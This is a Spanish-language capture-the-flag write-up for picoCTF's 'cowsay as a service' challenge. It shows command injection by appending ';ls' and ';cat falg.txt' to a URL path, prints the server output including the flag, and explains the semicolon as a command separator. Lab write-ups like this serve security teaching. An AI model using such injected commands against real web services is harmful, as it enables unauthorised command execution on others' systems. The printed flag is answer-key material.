## Descripción 
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

## Datos de Acceso al Nivel
user: carlosof / kali
password:

## Solución
- Ingresamos a la pagina web.
- Podemos cortar esta parte de la ruta ``/cowsay/{message}`` y remplazar {message} por cualquier otra cosa, así que si probamos con `;ls` nos devuelve esto:

`https://caas.mars.picoctf.net/cowsay/{};ls`
```bash
 ____
< {} >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

- Hacemos un `cat` a `falg.txt`:
`https://caas.mars.picoctf.net/cowsay/%7B%7D;cat falg.txt`

```bash
 ____
< {} >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```
## Notas Adicionales
**`;`**: El punto y coma (`;`) es un carácter especial en muchos sistemas operativos, especialmente en **Unix/Linux**. En una terminal, el punto y coma permite ejecutar múltiples comandos en una sola línea. Por ejemplo, si tienes `ls; ls`, se ejecutarán ambos comandos (`ls` y `ls`).
## Referencias 
https://play.picoctf.org/practice/challenge/202
[Cómo funcionan los ataques de inyección de comandos en servidores (redeszone.net)](https://www.redeszone.net/tutoriales/seguridad/que-son-ataques-inyeccion-comandos/#:~:text=Ataques%20de%20inyecci%C3%B3n%20de%20comandos%3A%20qu%C3%A9%20son%20y,4%20Conclusiones%20de%20este%20tipo%20de%20amenaza%20)